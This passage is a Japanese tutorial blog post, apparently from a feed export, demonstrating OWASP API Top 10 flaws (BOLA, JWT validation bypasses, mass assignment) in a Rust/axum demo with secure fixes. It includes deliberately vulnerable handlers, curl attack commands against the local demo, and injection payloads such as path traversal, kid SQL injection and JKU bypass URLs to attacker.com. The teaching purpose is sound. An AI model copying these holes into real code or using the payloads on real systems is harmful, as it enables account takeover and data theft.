}}これにより、ハンドラ関数で?演算子を使うだけで、エラーの種類に応じたHTTPレスポンスに変換される。認証・認可の実装パターンaxumのFromRequestPartsトレイトを実装したExtractorを使う。Extractorとは「抽出器」のことで、HTTPリクエストから必要な情報（ここでは認証情報）を自動的に取り出す仕組みだ。これがこのデモの核心部分だ。/// Extractor for authenticated user claims (secure version)#[derive(Debug, Clone)]pub struct AuthenticatedUser(pub UserClaims);impl<S> FromRequestParts<S> for AuthenticatedUserwhere    S: Send + Sync,{    type Rejection = AppError;    fn from_request_parts(        parts: &mut Parts,        _state: &S,    ) -> impl Future<Output = Result<Self, Self::Rejection>> + Send {        let result = extract_auth_from_parts(parts, false);        async move { result.map(AuthenticatedUser) }    }}Extractorパターンの利点を挙げる。宣言的: 関数シグネチャにAuthenticatedUserがあれば認証必須と一目でわかる再利用可能: 同じExtractorを全エンドポイントで使い回せるテスト容易: Extractorを差し替えてテスト可能失敗時の自動レスポンス: 認証失敗時は自動で401を返す「脆弱な」バージョンも用意している。/// Extractor for user claims WITHOUT proper validation (vulnerable version)#[derive(Debug, Clone)]pub struct VulnerableAuthUser(pub UserClaims);これは署名検証をスキップし、期限切れトークンも受け入れる。教育目的のみ。データベース層の設計SQLiteを使い、認可の有無でメソッドを分けている。/// Get order by ID (no authorization check - vulnerable)pub fn get_order_by_id(&self, id: i64) -> Result<Option<Order>, AppError> {    let conn = self.conn.lock().unwrap();    let mut stmt = conn.prepare(        \\"SELECT id, user, product, quantity FROM orders WHERE id = ?1\\"    )?;    // ...}/// Get order by ID with user check (secure)pub fn get_order_by_id_for_user(&self, id: i64, user: &str) -> Result<Option<Order>, AppError> {    let conn = self.conn.lock().unwrap();    let mut stmt = conn.prepare(        \\"SELECT id, user, product, quantity FROM orders WHERE id = ?1 AND user = ?2\\"    )?;    // ...}「なぜSQLで認可するのか。アプリケーション層でフィルタすればいいのでは」という疑問もあるだろう。アプリケーション層でも可能だが、DB層で認可する利点がある。パフォーマンス: 不要なデータをDBから取得しない防御の多層化: アプリ層のバグがあってもDB層で防げる一貫性: SQLで認可ロジックが一箇所に集約されるしかし、複雑な認可ルール（「自分のチームのデータ」など）はアプリ層で実装したほうが保守しやすい場合もある。依存関係の選定理由Cargo.tomlから主要な依存関係とその理由を説明する。# Web frameworkaxum = { version = \\"0.8\\", features = [\\"macros\\"] }axum: Tokioチームが開発、型安全、Extractorパターン。Actix-webより新しく、モダンな設計。# Authentication & Authorizationjsonwebtoken = \\"9\\"argon2 = \\"0.5\\"jsonwebtoken: Rustで最もポピュラーなJWTライブラリ。argon2: パスワードハッシュの現行推奨アルゴリズム。bcryptより新しく、メモリハード。# Error handlingthiserror = \\"2\\"thiserror: 派生マクロでボイラープレートを削減。#[error(\\"...\\")]でDisplay実装が自動生成される。# Rate limitinggovernor = \\"0.8\\"governor: トークンバケットアルゴリズムの実装。非同期対応。# Databaserusqlite = { version = \\"0.32\\", features = [\\"bundled\\"] }rusqlite: SQLiteバインディング。bundledでSQLiteを同梱（環境依存を排除）。本番ではPostgreSQLやMySQLを推奨。テスト戦略各モジュールにユニットテストを配置している。#[cfg(test)]mod tests {    use super::*;    #[test]    fn test_order_authorization() {        let db = Database::new_in_memory().unwrap();        let order = db.create_order(\\"alice\\", \\"Test Product\\", 5).unwrap();        // Alice can access her order        let result = db.get_order_by_id_for_user(order.id, \\"alice\\").unwrap();        assert!(result.is_some());        // Bob cannot access Alice\'s order        let result = db.get_order_by_id_for_user(order.id, \\"bob\\").unwrap();        assert!(result.is_none());    }}より、scripts/test_all.shでE2E的な統合テストを実行。各エンドポイントに実際にHTTPリクエストを送り、脆弱なエンドポイントで攻撃が成功すること、安全なエンドポイントで攻撃が失敗することを検証する。API1: BOLA - 最も危険で、最も見落とされやすい脆弱性OWASP API Security Top 10の堂々第1位がBOLA（Broken Object Level Authorization）だ。日本語では「オブジェクトレベル認可の不備」。https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/owasp.org名前が難しそうに見えるが、中身は簡単だ。要するに「BobがAliceのデータを見られてしまう」という、小学生でも「それダメでしょ」とわかる問題だ。しかし、驚くほど多くの本番システムにこれがある。人類は学ばない。なぜBOLAが最も危険なのかBOLAが1位である理由は明確だ。発生頻度が非常に高い - ほぼすべてのAPIがリソースIDを扱う。そのすべてで認可チェックが必要自動化しやすい - 攻撃者はIDを1, 2, 3...と順に試すだけ。スクリプト数行で全データを列挙できる検出が困難 - 正規のリクエストと見分けがつかない。WAFでは防げない影響が甚大 - 顧客データ、取引履歴、個人情報がすべて漏洩する可能性実際のインシデント事例BOLAによる情報漏洩は数え切れないほど発生している。2019年 First American Financial - 不動産の取引記録8億8500万件が流出。URLのIDを変えるだけで他人の書類にアクセス可能だった2018年 Facebook - View As機能の脆弱性で5000万アカウントのトークンが漏洩多数のモバイルアプリ - APIエンドポイントのID推測で他ユーザーのプロフィールにアクセス可能これらに共通するのは「認証はしていたが、認可が不十分だった」という点だ。ログインしているからといって、すべてのデータにアクセスできるわけではない。この当たり前のことを、コードで正しく実装するのは意外と難しい。なぜ開発者はBOLAを生み出してしまうのか認証と認可の混同 - 「ログインしてるからOK」という思い込みフレームワークの過信 - 「認証ミドルウェアを通ってるから安全」という誤解テストの盲点 - 機能テストは自分のデータでしか行わないIDの予測可能性 - 連番IDは攻撃を容易にする（でもUUIDでも根本解決にならない）開発速度優先 - 「認可は後で追加する」と言いながら忘れる脆弱なコード/// VULNERABLE: Returns any order by ID without checking ownershipasync fn vulnerable_get_order(    State(state): State<Arc<AppState>>,    _user: AuthenticatedUser, // 認証情報を受け取っているが...    Path(order_id): Path<i64>,) -> Result<Json<Order>, AppError> {    // 使っていない。アンダースコアプレフィックスがそれを物語っている    let order = state.db.get_order_by_id(order_id)?        .ok_or_else(|| AppError::NotFound(format!(\\"Order {} not found\\", order_id)))?;    Ok(Json(order))}_userとしてわざわざ認証情報を受け取っているのに、アンダースコアつけて無視している。これは「セキュリティチェックしてますよ」というアリバイ作りにすらなっていない。むしろ「チェックしようとして忘れた」という証拠だ。安全なコード/// SECURE: Returns order only if it belongs to the authenticated userasync fn secure_get_order(    State(state): State<Arc<AppState>>,    user: AuthenticatedUser,  // アンダースコアなし    Path(order_id): Path<i64>,) -> Result<Json<Order>, AppError> {    let user_id = &user.0.sub;    // 「注文ID」と「ユーザーID」の両方でDBを検索    let order = state.db.get_order_by_id_for_user(order_id, user_id)?        .ok_or_else(|| AppError::NotFound(format!(            \\"Order {} not found or access denied\\", order_id        )))?;    Ok(Json(order))}違いは1行だけ。たった1行。でも、この1行が「情報漏洩インシデント発生」と「平穏な運用」の分かれ道だ。微妙な脆弱性：一見正しそうに見えるバグ本番環境で見つかる脆弱性の多くは、明らかな間違いではない。「一見正しそうに見える」コードに潜んでいる。このデモには3つの「微妙な脆弱性」エンドポイントを用意した。微妙な脆弱性 #1: クエリパラメータによる上書き#[derive(Deserialize)]struct UserIdQuery {    user_id: Option<String>,}/// 「デバッグ用にuser_idをクエリパラメータで指定できるようにしよう」/// という親切心から生まれた脆弱性async fn subtle_vulnerable_get_order(    State(state): State<Arc<AppState>>,    user: AuthenticatedUser,  // ちゃんと認証してる！    Path(order_id): Path<i64>,    Query(query): Query<UserIdQuery>,) -> Result<Json<Order>, AppError> {    // BUG: クエリパラメータが認証情報を上書きしてしまう    let user_id = query.user_id.unwrap_or_else(|| user.0.sub.clone());    let order = state        .db        .get_order_by_id_for_user(order_id, &user_id)?  // user_idが攻撃者の指定した値に！        .ok_or_else(|| AppError::NotFound(\\"...\\"))?;    Ok(Json(order))}攻撃方法を見てみよう。# Bobとして認証BOB_TOKEN=$(curl -s http://localhost:8080/token/bob | jq -r .access_token)# クエリパラメータでAliceになりすましcurl -H \\"Authorization: Bearer $BOB_TOKEN\\" \\\\     \\"http://localhost:8080/subtle/orders/1?user_id=alice\\"このパターンは実際のコードレビューでよく見る。「管理画面でユーザーを切り替えて確認したい」「サポート担当がユーザーの代わりに操作する機能が必要」などの要件から生まれがち。対策は「そもそもこの機能は必要か」を問い直すことと、必要なら別の認証フローを用意すること。微妙な脆弱性 #2: TOCTOU（Time-of-Check-Time-of-Use）async fn race_condition_get_order(    State(state): State<Arc<AppState>>,    user: AuthenticatedUser,    Path(order_id): Path<i64>,) -> Result<Json<Order>, AppError> {    let user_id = &user.0.sub;    // Step 1: 注文を取得（全件から）    let order = state.db.get_order_by_id(order_id)?        .ok_or_else(|| AppError::NotFound(...))?;    // ↑ この時点で機密データがメモリに載っている！    // Step 2: 所有者をチェック    if order.user != *user_id {        // エラーメッセージが情報を漏らす        return Err(AppError::Forbidden(format!(            \\"Order {} belongs to another user\\",  // 存在することを教えてしまう            order_id        )));    }    Ok(Json(order))}何が問題なのか。データをフェッチしてから認可チェックしている。認可が通らなくても、データは既にメモリ上にあるエラーメッセージが情報を漏らす。「存在しない」と「アクセス権がない」が区別できるログに所有者情報が残る。認可失敗時のログにorder_owner = order.userを出力している正しい順序は「認可チェック → データフェッチ」だが、「IDだけでは認可チェックできない」という理由でこの順序になりがち。解決策はDB層でget_order_by_id_for_userのように、フェッチと認可を一体化すること。微妙な脆弱性 #3: 認可前のログ出力async fn logging_before_auth_get_order(    State(state): State<Arc<AppState>>,    user: AuthenticatedUser,    Path(order_id): Path<i64>,) -> Result<Json<Order>, AppError> {    // 「監査のために全リクエストをログに残す」という要件から    let order = state.db.get_order_by_id(order_id)?;    // 認可チェック前に詳細をログ出力    if let Some(ref o) = order {        tracing::info!(            order_id = o.id,            order_user = o.user,       // 誰の注文かログに残る            order_product = o.product, // 何を買ったかログに残る            requester = user.0.sub,            \\"Order access attempted\\"        );    }    // ここで認可チェック（でも遅い）    let order = order.ok_or_else(|| AppError::NotFound(...))?;    if order.user != user.0.sub {        return Err(AppError::Forbidden(\\"Access denied\\".to_string()));    }    Ok(Json(order))}ログは「セキュリティのために残す」という意図だが、認可前にログを取ると攻撃者がアクセスできないデータがログに残る。これは情報漏洩だ。ログ収集基盤に脆弱性があった場合、このログから機密情報が漏れる。正しいパターンを示す。認可前のログは「誰が」「何にアクセスしようとしたか（IDのみ）」認可後のログは詳細情報を含めてOK実際に攻撃してみる# サーバー起動cargo run --release --bin bola-demo# Bobのトークンを取得BOB_TOKEN=$(curl -s http://localhost:8080/token/bob | jq -r .access_token)# 脆弱なエンドポイント: BobがAliceの注文(ID=1)を取得curl -H \\"Authorization: Bearer $BOB_TOKEN\\" \\\\     http://localhost:8080/vulnerable/orders/1結果を見てみよう。{  \\"id\\": 1,  \\"user\\": \\"alice\\",  \\"product\\": \\"Widget A\\",  \\"quantity\\": 5}Bobが、Aliceの注文データを取得できてしまった。 Aliceは知らない。Bobは黙っている。システムは何も気づいていない。これが現実のインシデントだったら、ニュースになるやつだ。安全なエンドポイントでは以下のようになる。curl -H \\"Authorization: Bearer $BOB_TOKEN\\" \\\\     http://localhost:8080/orders/1結果はこうなる。{  \\"error\\": \\"Order 1 not found or access denied\\"}404を返している点もポイントだ。「なんで403（Forbidden）じゃないのか」という疑問があるだろう。403は「その注文は存在するよ。しかしお前には見せない」という意味である404は「何の話だ。そんな注文知らないが」という意味である403は「存在する」という情報を漏らしている。攻撃者にヒントを与えないためには404のほうが適切だ。API2: Broken Authentication - JWT検証の問題「署名さえ正しければOK」という誤解を打ち砕くデモ。https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/owasp.orgなぜJWT検証で失敗するのかJWTは「署名で改ざんを検出できる」という特性から、安全だと誤解されやすい。しかし、JWTのセキュリティは署名検証だけでは不十分だ。以下の検証がすべて必要だ。 検証項目  何をチェックするか  省略するとどうなるか  署名 (signature)  トークンが改ざんされていないか  偽造トークンが通る  有効期限 (exp)  トークンが期限内か  永久に使えるトークンが発生  発行者 (iss)  正当な発行者が作ったか  他システムのトークンが通る  オーディエンス (aud)  このAPIで使うべきか  別サービスのトークンが通る  Not Before (nbf)  まだ使用開始前ではないか  未来のトークンが先に使える JWTに関する危険な誤解「署名が正しければ安全」 → 署名は「改ざんされていない」だけで「使っていい」は別の話「JWTライブラリを使えば安全」 → デフォルト設定が安全とは限らない「短い有効期限だから大丈夫」 → expチェックを無効にしていたら意味がない「リフレッシュトークンで更新するから」 → 古いアクセストークンが使えたら問題cargo run --release --bin broken-auth-demo脆弱な実装：署名以外を検証しない/// VULNERABLE: Validates JWT signature but skips claim validationasync fn vulnerable_validate_token(headers: HeaderMap) -> Result<Json<TokenValidationResponse>, AppError> {    // ...    // VULNERABLE: Disable all validation except signature    let mut validation = Validation::new(Algorithm::HS256);    validation.validate_exp = false; // 有効期限チェックしない！    validation.validate_aud = false; // audience チェックしない！    validation.required_spec_claims.clear(); // 必須クレームなし！    let result = decode::<UserClaims>(        token,        &DecodingKey::from_secret(JWT_SECRET.as_bytes()),        &validation,    );    // ...}これが危険な理由：期限切れトークンが使い放題（退職した社員のトークンが永久に有効）別サービス用のトークンが使える（audがチェックされないため）なりすましトークンが通る（issがチェックされないため）安全な実装：全クレームを検証/// SECURE: Properly validates all JWT claimsasync fn secure_validate_token(headers: HeaderMap) -> Result<Json<TokenValidationResponse>, AppError> {    // ...    // SECURE: Enable all validation    let mut validation = Validation::new(Algorithm::HS256);    validation.set_audience(&[JWT_AUDIENCE]);  // この API 用か？    validation.set_issuer(&[JWT_ISSUER]);      // 正当な発行者か？    validation.validate_exp = true;             // 期限内か？    let result = decode::<UserClaims>(        token,        &DecodingKey::from_secret(JWT_SECRET.as_bytes()),        &validation,    );    // ...}テスト用トークン生成このデモでは4種類のトークンを生成できる。async fn generate_test_token(Path(token_type): Path<String>) -> Result<Json<TokenInfo>, AppError> {    let (claims, description) = match token_type.as_str() {        \\"valid\\" => {            // 有効なトークン（1時間後に期限切れ）            let claims = UserClaims {                exp: (Utc::now() + Duration::hours(1)).timestamp() as usize,                aud: Some(JWT_AUDIENCE.to_string()),                iss: Some(JWT_ISSUER.to_string()),                // ...            };            (claims, \\"Valid token - expires in 1 hour\\")        }        \\"expired\\" => {            // 期限切れトークン（1時間前に期限切れ）            let claims = UserClaims {                exp: (Utc::now() - Duration::hours(1)).timestamp() as usize, // 過去！                // ...            };            (claims, \\"Expired token - expired 1 hour ago\\")        }        \\"wrong-audience\\" => {            // 別サービス用のトークン            let claims = UserClaims {                aud: Some(\\"https://wrong-audience.com\\".to_string()), // 別のサービス！                // ...            };            (claims, \\"Token with wrong audience\\")        }        \\"wrong-issuer\\" => {            // 不正な発行者のトークン            let claims = UserClaims {                iss: Some(\\"https://malicious-issuer.com\\".to_string()), // 偽者！                // ...            };            (claims, \\"Token with wrong issuer\\")        }        // ...    };}攻撃シナリオを試してみよう。# 期限切れトークンを取得EXPIRED=$(curl -s http://localhost:8080/token/expired | jq -r .access_token)# 脆弱なエンドポイント → 通る！curl -H \\"Authorization: Bearer $EXPIRED\\" http://localhost:8080/vulnerable/validate# 安全なエンドポイント → 401 Unauthorizedcurl -H \\"Authorization: Bearer $EXPIRED\\" http://localhost:8080/validate微妙な脆弱性：JWT検証の巧妙なバイパス「全クレームを検証しているから安全」と思っていないだろうか。残念ながら、JWT検証にはもっと狡猾な問題がある。微妙な脆弱性 #1: アルゴリズム混同攻撃/// 開発者の意図: 「RS256もHS256もサポートして柔軟に」/// 現実: RS256の公開鍵をHS256の秘密鍵として使われるasync fn subtle_alg_confusion(headers: HeaderMap) -> Result<...> {    let header = jsonwebtoken::decode_header(token)?;    // BUG: トークンが主張するアルゴリズムを信用    let mut validation = Validation::new(header.alg);  // ← header.alg を信用！    validation.set_audience(&[JWT_AUDIENCE]);    validation.set_issuer(&[JWT_ISSUER]);    // 攻撃:    // 1. サーバーのRS256公開鍵を取得（公開されてる）    // 2. その公開鍵をHS256の秘密鍵として使ってトークン署名    // 3. {\\"alg\\": \\"HS256\\"} としてサーバーに送信    // 4. サーバーは公開鍵を「HS256の秘密鍵」として検証 → 成功！    let result = decode::<UserClaims>(        token,        &DecodingKey::from_secret(JWT_SECRET.as_bytes()),        &validation,    );}対策：アルゴリズムは固定値で指定。トークンのalgヘッダーを信用してはいけない。微妙な脆弱性 #2: Key ID (kid) インジェクション/// 開発者の意図: 「kidヘッダーで鍵を選択」/// 現実: kidに任意の値を入れられるasync fn subtle_kid_injection(headers: HeaderMap) -> Result<...> {    let header = jsonwebtoken::decode_header(token)?;    // BUG: kidを検証なしで使用    let kid = header.kid.unwrap_or_else(|| \\"default\\".to_string());    // 実際の脆弱なコード例：    // SQLインジェクション: kid = \\"key1\' OR \'1\'=\'1\\"    // let key = db.query(f\\"SELECT key FROM keys WHERE id = \'{kid}\'\\");    // パストラバーサル: kid = \\"../../../etc/passwd\\"    // let key = fs::read(format!(\\"/keys/{}.pem\\", kid));    // NULLキー: kid = \\"../../dev/null\\"    // 空のキーで署名検証 → 常に成功}kidは信頼できない入力。許可リスト方式でキーを選択するべき。微妙な脆弱性 #3: JKU (JWK Set URL) バイパス/// 開発者の意図: 「JKUヘッダーから公開鍵を取得」/// 現実: 攻撃者のサーバーから鍵を取得させられるasync fn subtle_jku_bypass(headers: HeaderMap) -> Result<...> {    let header = jsonwebtoken::decode_header(token)?;    if let Some(jku) = header.jku {        // BUG: 弱いチェック        let allowed_prefix = \\"https://auth.example.com\\";        if jku.starts_with(allowed_prefix) {            // 攻撃:            // jku = \\"https://auth.example.com.attacker.com/keys\\"            // jku = \\"https://auth.example.com@attacker.com/keys\\"            // jku = \\"https://auth.example.com%2F@attacker.com/keys\\"            // 全部 starts_with チェックを通過！            let keys = fetch_jwks_from_url(&jku).await?;            // 攻撃者の公開鍵を取得 → 攻撃者が署名したトークンが有効に        }    }}JKUは使わないか、完全一致でURLをチェックするべき。微妙な脆弱性 #4: Not-Before (nbf) 未検証/// 開発者の意図: 「expさえチェックすれば大丈夫」/// 現実: 未来用に発行されたトークンが今使えるasync fn subtle_nbf_skip(headers: HeaderMap) -> Result<...> {    let mut validation = Validation::new(Algorithm::HS256);    validation.set_audience(&[JWT_AUDIENCE]);    validation.set_issuer(&[JWT_ISSUER]);    validation.validate_exp = true;    validation.validate_nbf = false;  // BUG: nbfを検証しない    // 攻撃シナリオ:    // 1. 管理者が「来月1日から有効」なトークンを事前発行    // 2. そのトークンが漏洩    // 3. 攻撃者は今すぐそのトークンを使用 → nbf無視で成功    // または:    // 1. 内部犯行者が未来日付のトークンを大量に生成    // 2. 退職後にそれらを使用    // 3. expはチェックされるがnbfはスルー → アクセス成功}nbfクレームもexpと同様に重要。「まだ有効ではない」トークンを拒否しないと、事前発行されたトークンが悪用される。HS256 vs RS256JWT認証では2つの主要なアルゴリズムがある。// HS256: 同じ鍵で署名と検証（対称鍵）const HS256_SECRET: &str = \\"your-256-bit-secret-key-here-must-be-long-enough\\";// RS256: 秘密鍵で署名、公開鍵で検証（非対称鍵）const RS256_PRIVATE_KEY: &str = r#\\"-----BEGIN PRIVATE KEY-----MIIEvgIBADANBgkqhkiG9w0BAQEFAASC...-----END PRIVATE KEY-----\\"#;const RS256_PUBLIC_KEY: &str = r#\\"-----BEGIN PUBLIC KEY-----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A...-----END PUBLIC KEY-----\\"#;なぜRS256が推奨されるのか。HS256は署名と検証に同じ鍵を使う。検証側にも秘密鍵が必要になり、漏洩リスクが高いRS256は署名に秘密鍵、検証に公開鍵を使う。公開鍵は配布しても安全なので、マイクロサービス向きAPI3: Mass Assignment - 見えないフィールドを操作されるこれは個人的に「一番やらかしやすい」脆弱性だ。そして「やらかしても気づきにくい」という意味で最も厄介だろう。https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/owasp.orgMass Assignmentとは何かMass Assignment（一括代入）は、クライアントから送られてきたデータを、サーバー側のオブジェクトにそのまま「一括で」割り当ててしまうことで発生する脆弱性だ。もともとはRuby on RailsやPHPのLaravelなど、「お手軽にCRUDを作れるフレームワーク」で頻発していた。これは「フォームのフィールドをそのままDBカラムにマッピング」する機能が便利すぎて、セキュリティを犠牲にしていた。Rustは型付けが厳格なので「安全」と思われがちだが、serdeでJSONをデシリアライズする際に同様の問題が発生しうる。serdeとはRustで最も広く使われているシリアライズ/デシリアライズ用のライブラリで、JSONなどのデータ形式とRustの構造体を相互変換できる。なぜ開発者はこのミスを犯すのか便利さの誘惑 - 「リクエストとモデルの型を同じにすればコードが減る」フィールド追加時の見落とし - DBにstatusカラムを追加 → Rustの構造体にも追加 → リクエスト型にも追加 → やらかし「デフォルト値があるから大丈夫」という誤解 - #[serde(default)]は「送られなかったら」デフォルト、「送られたら」その値テスト時の盲点 - 正常系では余分なフィールドを送らないので気づかない操作される可能性のあるフィールド攻撃者が狙う典型的なフィールドを挙げる。 フィールド  本来の用途  攻撃による悪用  status  処理状態管理  \\"pending\\" → \\"approved\\" で承認をバイパス  role  権限管理  \\"user\\" → \\"admin\\" で権限昇格  is_verified  検証フラグ  false → true で検証をスキップ  price  価格  1000 → 1 で値引き  user_id  所有者  他人のIDを指定してなりすまし  created_at  作成日時  過去の日付を指定して古いデータを偽装  id  主キー  既存IDを指定して上書き攻撃 例えば、支払い作成APIで、ユーザーが送ってきたJSONをそのまま使ってしまうケースを見てみよう。/// VULNERABLE: Accepts any fields from user input#[derive(Deserialize)]pub struct UnsafePaymentRequest {    pub amount: f64,    pub currency: String,    #[serde(default)]    pub status: Option<String>,  // ユーザーが設定可能になっている}async fn vulnerable_create_payment(    Json(req): Json<UnsafePaymentRequest>,) -> Json<Payment> {    let payment = Payment {        id: Uuid::new_v4().to_string(),        amount: req.amount,        currency: req.currency,        status: req.status.unwrap_or_else(|| \\"pending\\".to_string()),        // ↑ ユーザーが\\"approved\\"を送ってきたらそのまま使っちゃう    };    Json(payment)}攻撃してみよう。curl -X POST http://localhost:8080/vulnerable/payments \\\\     -H \\"Content-Type: application/json\\" \\\\     -d \'{\\"amount\\": 100, \\"currency\\": \\"USD\\", \\"status\\": \\"approved\\"}\'結果は\\"status\\": \\"approved\\"であり、未払いの支払いが承認済みになった。支払いステータスを「承認済み」に設定して、実際には支払いをしない。システムは何も気づかない。対策: DTOを分けるDTOとは「Data Transfer Object」の略で、データを受け渡すための専用オブジェクトだ。ここでは「ユーザーからの入力を受け取るための構造体」と「内部処理で使う構造体」を分けるという意味で使っている。/// SECURE: Only accepts allowed fields#[derive(Deserialize)]pub struct CreatePaymentRequest {    pub amount: f64,    pub currency: String,    // statusフィールドは存在しない}async fn secure_create_payment(    Json(req): Json<CreatePaymentRequest>,) -> Json<Payment> {    let payment = Payment::new(req.amount, req.currency);    // statusは常にサーバー側で\\"pending\\"に設定される    Json(payment)}入力用のDTOと内部用のモデルを分ける。コード量は増える。型定義は増える。でも、これが「自由度の高いAPI」と「セキュアなAPI」の違いだ。自由には責任が伴う。微妙なMass Assignment：serde flattenの罠「入力DTOを分けた」と言っても、実装の仕方次第で脆弱になる。微妙な脆弱性 #1: #[serde(flatten)]の問題#[derive(Deserialize, Serialize)]struct FlattenedPaymentRequest {    amount: f64,    currency: String,    // 「未知のフィールドをログに残したい」という意図    #[serde(flatten)]    extra_fields: HashMap<String, serde_json::Value>,}async fn subtle_flatten_payment(    State(state): State<Arc<AppState>>,    _user: AuthenticatedUser,    Json(req): Json<FlattenedPaymentRequest>,) -> Result<Json<Payment>, AppError> {    let mut payment = Payment::new(req.amount, req.currency.clone());    // 「extra_fieldsに有効なstatusがあれば使おう」    // 開発者の意図：「クライアントの便宜を図る」    // 現実：Mass Assignmentの再来    if let Some(status) = req.extra_fields.get(\\"status\\") {        if let Some(s) = status.as_str() {            if [\\"pending\\", \\"approved\\", \\"rejected\\"].contains(&s) {                payment.status = s.to_string();  // approved も有効な値！            }        }    }    state.db.create_payment(&payment)?;    Ok(Json(payment))}#[serde(flatten)]とHashMapの組み合わせは便利だが、「未知のフィールドを捕捉する」という性質が裏目に出る。コードレビューでflattenを見たら警戒しよう。微妙な脆弱性 #2: 部分更新の罠PATCH（部分更新）エンドポイントは特に危険だ。#[derive(Deserialize)]struct PartialPaymentUpdate {    amount: Option<f64>,    currency: Option<String>,    // 「ユーザーが自分でキャンセルできるように」status を追加    #[serde(default)]    status: Option<String>,}async fn subtle_update_payment(    State(state): State<Arc<AppState>>,    _user: AuthenticatedUser,    Path(payment_id): Path<String>,    Json(update): Json<PartialPaymentUpdate>,) -> Result<Json<Payment>, AppError> {    let mut payment = state.db.get_payment_by_id(&payment_id)?        .ok_or_else(|| AppError::NotFound(...))?;    // 部分更新ロジック    if let Some(amount) = update.amount {        payment.amount = amount;    }    if let Some(currency) = update.currency {        payment.currency = currency;    }    // 「キャンセルは許可、でも承認は決済システム経由のみ」のつもり    if let Some(status) = update.status {        if payment.status == \\"pending\\" && status == \\"approved\\" {            // 開発者：「pendingからapprovedへの遷移だけ許可」            // 現実：これがまさに攻撃者がやりたいこと！            payment.status = status;        } else if payment.status == \\"pending\\" && status == \\"cancelled\\" {            payment.status = status;        }    }    Ok(Json(payment))}条件分岐で「許可する遷移」を書いたつもりが、攻撃者が欲しいものを許可している。ロジックが複雑になるほど、こういうミスは見つけにくくなる。攻撃方法を見てみよう。# 支払いを作成PAYMENT_ID=$(curl -s -X POST http://localhost:8080/payments \\\\  -H \\"Authorization: Bearer $TOKEN\\" \\\\  -H \\"Content-Type: application/json\\" \\\\  -d \'{\\"amount\\": 100, \\"currency\\": \\"USD\\"}\' | jq -r .id)# 部分更新でステータスを承認済みにcurl -X POST \\"http://localhost:8080/subtle/payments/$PAYMENT_ID\\" \\\\  -H \\"Authorization: Bearer $TOKEN\\" \\\\  -H \\"Content-Type: application/json\\" \\\\  -d \'{\\"status\\": \\"approved\\"}\'実装で学んだこと1. 認証と認可は別物これは何度言っても足りない。認証: 「あなたは誰か」 → 「私はBobです」認可: 「Bobさん、あなたはこれをしていいのか」 → 「...ダメです」JWTを検証して「このユーザーは本物だ」とわかっても、「このユーザーがこのリソースにアクセスしていいか」は全く別の問題だ。会社のビルで例えるとこうだ。認証 = 社員証を見せて入館する認可 = サーバールームに入れるかどうか社員証を持っていても、全員がサーバールームに入れるわけではない。当たり前だ。でも、APIでは「認証してるから大丈夫」と言ってしまいがちなのだ。2. 404 vs 403認可エラーの際に403を返すか404を返すか。403: リソースの存在を明かしつつアクセスを拒否404: リソースの存在自体を隠すセキュリティ的には404が安全だ。403は「存在する」という情報を漏らしている。しかし、デバッグは困難になる。「404なんだけど、本当に存在しないのか、権限がないのか」がわからない。本番環境では404、開発環境では403にするとか、ログには詳細を残すとか、工夫が必要だ。3. DTOの分離は面倒だが必要入力用の構造体と内部用の構造体を分けるのは、確かに面倒だ。同じようなものを2回書くことになる。しかし、Mass Assignment攻撃を防ぐには必要なコストだ。Rustの場合、コンパイル時に型チェックされるので、「うっかりユーザー入力をそのまま使ってしまう」ミスは起きにくい。CreatePaymentRequestにstatusフィールドがなければ、コンパイラが「そんなフィールドないよ」と教えてくれる。これはRustの強みだ。動的型付け言語だと、こうはいかない。続きは後編へ → API4 (Rate Limit), API5 (BFLA), API7 (SSRF), 動作確認、まとめ参考リンクOWASP API Security Top 10 (2023)公式ドキュメント。owasp.orgaxum - Rust Web Framework本デモで使用しているWebフレームワーク。github.comjsonwebtoken - Rust JWT LibraryJWT認証の実装に使用。github.comthiserror - Rust Error Handlingエラー型の定義に使用。github.comJWT.ioJWTのデバッグ・検証ツール。jwt.ioRFC 7519 - JSON Web Token (JWT)JWTの仕様。datatracker.ietf.orgCWE-639: Authorization Bypass Through User-Controlled KeyBOLAに関連するCWEエントリ。cwe.mitre.orgCWE-915: Improperly Controlled Modification of Dynamically-Determined Object AttributesMass Assignmentに関連するCWEエントリ。cwe.mitre.org","isoDate":"2025-12-05T01:49:19.000Z","dateMiliSeconds":1764899359000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"AlloyDB と Cloud Spanner (スケーラビリティの境界)","link":"https://silasol.la/posts/2025-12-05-01_alloy-db-and-spanner/","contentSnippet":"AlloyDB と Cloud Spanner のアーキテクチャの違いやスケーラビリティの境界について解説します．","isoDate":"2025-12-05T00:00:00.000Z","dateMiliSeconds":1764892800000,"authorName":"Masaki Haga","authorId":"silasolla"},{"title":"おい、テックブログを書け","link":"https://speakerdeck.com/nwiizo/oi-tetukuburoguwoshu-ke","contentSnippet":"2025年12月5日に「おい、テックブログを書け」という登壇をした。\\r\\r「おい」である。命令形である。30分間、人前に立って「書け」と言い続けるという、冷静に考えるとなかなか傲慢な振る舞いをしてきたわけだが、登壇資料を作っている最中、ふと気づいてしまった。書けと言っている自分は、なぜ書いているのだろうか、と。\\r\\r技術ブログを書くことについて語ろうとすると、それは私が「書いてきた」ことを晒すことに他ならず、AIとの付き合い方を語ろうとすると、それは私が「どう仕事をしているか」を開陳することと紙一重になる。そうなると聞いている側からすれば、こいつは結局、自分の話がしたいだけなのではないか、登壇という大義名分を得て気持ちよく自分語りをしているだけなのではないか、と思われても仕方がない。いや、実際そうなのかもしれない。そう見られることへの嫌悪感と、そう見られまいと振る舞う自分への嫌悪感が同時に存在していて、どちらに転んでも結局イヤなやつなのである。\\r\\rしかし登壇というのは厄介なもので、「書け」と命令するからには、自分がなぜ書いてきたのかを明かさなければ説得力がない。説得力のない登壇ほど空虚なものはない。空虚な登壇をする自分を想像して、それはそれで耐えられない。結局、自己開示から逃げられない構造になっている。なんという罠だろうか。\\r\\r身体性という言葉を使った。AIに記事を書かせることについて話した。私の答えは明確で、記事はほとんどAIに書かせている、しかし価値の源泉は私にある、と。私が素材を提供し、AIが構造化し、私がレビューして調整する。編集者としてのAI。この協働こそが現代の執筆だと、そう話した。話しながら、これは本当にそうだろうかと自分を疑う自分がいて、でもそういう迷いごと引き受けて喋るしかないのだった。\\r\\rまず自分のために書け、結果として、それが誰かを救う。そう締めくくった。